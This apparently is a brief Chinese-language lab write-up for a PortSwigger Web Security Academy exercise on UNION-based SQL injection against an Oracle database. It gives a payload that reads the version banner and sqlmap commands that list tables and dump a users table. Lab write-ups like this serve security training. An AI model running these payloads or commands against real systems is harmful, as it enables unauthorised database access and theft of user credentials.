产品类别处存在sql注入

并且已经知道数据库为oracle,并且可以使用union 联合注入



1. 确定数据库版本：

paylaod:

```javascript
/filter?category=Accessories'union+select+banner,'abc'+from+v$version--+
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/SQL/images/9429C63F178244F2AA55385F3DF0437Cclipboard.png)



2. 确定当前数据库

```javascript
 sqlmap  -u"https://acfa1ff31e4b331c8035914d002a000a.web-security-academy.net/filter?category=Accessories" 
 --current-db --technique U --dbms oracle
 
 --technique U 指定为union注入
 --dbms oracle 指定为oracle数据库
```



3. 爆表

```javascript
sqlmap  -u"https://acfa1ff31e4b331c8035914d002a000a.web-security-academy.net/filter?category=Accessories" 
--tables -D"SYSTEM" --technique U --dbms oracle
```



4. 爆数据

```javascript
sqlmap  -u"https://acfa1ff31e4b331c8035914d002a000a.web-security-academy.net/filter?category=Accessories" 
--dump -T"USERS_MZURNA" -D"SYSTEM" --technique U --dbms oracle
```

